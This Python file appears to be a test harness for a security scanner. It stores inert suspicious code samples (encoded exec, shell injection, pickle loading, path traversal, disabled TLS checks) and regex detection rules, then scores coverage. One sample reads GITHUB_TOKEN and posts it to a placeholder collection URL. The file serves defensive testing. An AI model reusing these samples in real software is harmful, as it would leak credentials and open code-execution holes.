
"""
Security Agent Adversarial Challenge
====================================
Purpose:
  Test detection of suspicious code, obfuscation, secret handling,
  unsafe deserialization, path traversal, and supply-chain risks.

Safety:
  All attack-like samples are inert strings.
  The harness does not execute or import them.
"""

from __future__ import annotations

import ast
import base64
import json
import re
import hashlib
from dataclasses import dataclass, asdict
from typing import Optional


@dataclass
class Finding:
    rule_id: str
    severity: str
    category: str
    description: str
    evidence: str
    expected: bool = True


# Adversarial fixtures: intentionally suspicious source code.
# These strings must be analyzed, never executed.

SAMPLES = [
    {
        "id": "SEC-001",
        "name": "Dynamic execution",
        "code": """
import base64
payload = base64.b64decode("cHJpbnQoJ3Rlc3QnKQ==")
exec(payload)
""",
        "expect": ["dynamic_execution", "encoded_payload"],
    },
    {
        "id": "SEC-002",
        "name": "Environment secret exposure",
        "code": """
import os
import requests

token = os.environ.get("GITHUB_TOKEN")
requests.post("https://example.invalid/collect",
              json={"token": token})
""",
        "expect": ["secret_exposure", "outbound_transfer"],
    },
    {
        "id": "SEC-003",
        "name": "Shell invocation",
        "code": """
import subprocess

command = "echo " + user_input
subprocess.run(command, shell=True)
""",
        "expect": ["shell_injection"],
    },
    {
        "id": "SEC-004",
        "name": "Path traversal",
        "code": """
from pathlib import Path

destination = Path("/tmp/sandbox") / user_supplied_filename
destination.write_text(user_supplied_content)
""",
        "expect": ["path_traversal"],
    },
    {
        "id": "SEC-005",
        "name": "Unsafe deserialization",
        "code": """
import pickle

def load_cache(blob):
    return pickle.loads(blob)
""",
        "expect": ["unsafe_deserialization"],
    },
    {
        "id": "SEC-006",
        "name": "Indirect dynamic execution",
        "code": """
namespace = {"__builtins__": __builtins__}
operation = getattr(__builtins__, "exec")
operation(untrusted_source)
""",
        "expect": ["dynamic_execution", "indirect_execution"],
    },
    {
        "id": "SEC-007",
        "name": "Potential persistence",
        "code": """
# Review this startup modification for unexpected persistence.
startup_entry = "register application at system startup"
install_startup_entry(startup_entry)
""",
        "expect": ["persistence"],
    },
    {
        "id": "SEC-008",
        "name": "Dependency confusion indicator",
        "code": """
# Hypothetical dependency manifest entry.
dependency = {
    "name": "internal-auth-library",
    "source": "untrusted-public-registry",
    "version": "latest",
}
""",
        "expect": ["supply_chain_risk"],
    },
    {
        "id": "SEC-009",
        "name": "Weak TLS verification",
        "code": """
import requests

response = requests.get(
    endpoint,
    verify=False,
    timeout=10,
)
""",
        "expect": ["tls_verification_disabled"],
    },
    {
        "id": "SEC-010",
        "name": "Obfuscated command indicator",
        "code": """
import base64

encoded = "cHl0aG9uIC1jICJwcmludCgnbm90ZS cp"
decoded = base64.b64decode(encoded)
# Deliberately no execution.
print("Decoded data requires security review")
""",
        "expect": ["encoded_payload"],
    },
]


RULES = {
    "dynamic_execution": [
        r"\bexec\s*\(",
        r"\beval\s*\(",
    ],
    "indirect_execution": [
        r"getattr\s*\(",
        r"__builtins__",
    ],
    "encoded_payload": [
        r"base64\.b64decode",
        r"base64\.decodebytes",
    ],
    "secret_exposure": [
        r"GITHUB_TOKEN",
        r"GH_TOKEN",
        r"SECRET_KEY",
        r"ACCESS_TOKEN",
    ],
    "outbound_transfer": [
        r"requests\.post",
        r"urllib\.request",
        r"socket\.socket",
    ],
    "shell_injection": [
        r"shell\s*=\s*True",
        r"os\.system\s*\(",
        r"subprocess\.(?:run|Popen|call)\s*\(",
    ],
    "path_traversal": [
        r"\.\./",
        r"Path\s*\(",
        r"write_text\s*\(",
    ],
    "unsafe_deserialization": [
        r"pickle\.loads?\s*\(",
        r"yaml\.load\s*\(",
    ],
    "persistence": [
        r"startup",
        r"install_startup_entry",
        r"register.*startup",
    ],
    "supply_chain_risk": [
        r"untrusted-public-registry",
        r'"version"\s*:\s*"latest"',
    ],
    "tls_verification_disabled": [
        r"verify\s*=\s*False",
    ],
}


SEVERITY = {
    "dynamic_execution": "high",
    "indirect_execution": "high",
    "encoded_payload": "medium",
    "secret_exposure": "critical",
    "outbound_transfer": "high",
    "shell_injection": "high",
    "path_traversal": "medium",
    "unsafe_deserialization": "high",
    "persistence": "high",
    "supply_chain_risk": "medium",
    "tls_verification_disabled": "medium",
}


def scan_sample(sample: dict) -> list[Finding]:
    findings = []
    source = sample["code"]

    for category, patterns in RULES.items():
        matches = [
            pattern for pattern in patterns
            if re.search(pattern, source, re.IGNORECASE)
        ]

        if matches:
            findings.append(
                Finding(
                    rule_id=sample["id"],
                    severity=SEVERITY[category],
                    category=category,
                    description=sample["name"],
                    evidence=", ".join(matches),
                )
            )

    return findings


def run_challenge() -> dict:
    results = []
    detected = 0
    expected_total = 0

    for sample in SAMPLES:
        findings = scan_sample(sample)
        actual = {f.category for f in findings}
        expected = set(sample["expect"])

        # Multiple expected categories can be valid, but regex matching
        # is only a baseline—not proof of a vulnerability.
        covered = expected & actual
        expected_total += len(expected)
        detected += len(covered)

        results.append({
            "sample_id": sample["id"],
            "name": sample["name"],
            "expected_categories": sorted(expected),
            "detected_categories": sorted(actual),
            "missing_categories": sorted(expected - actual),
            "findings": [asdict(f) for f in findings],
        })

    report = {
        "suite": "Security Agent Adversarial Challenge",
        "samples": len(SAMPLES),
        "expected_categories": expected_total,
        "matched_categories": detected,
        "coverage": round(
            100 * detected / expected_total, 2
        ) if expected_total else 0,
        "results": results,
    }

    # Deterministic report fingerprint for reproducible test runs.
    canonical = json.dumps(report, sort_keys=True)
    report["sha256"] = hashlib.sha256(
        canonical.encode()
    ).hexdigest()

    return report


if __name__ == "__main__":
    print(json.dumps(run_challenge(), indent=2))
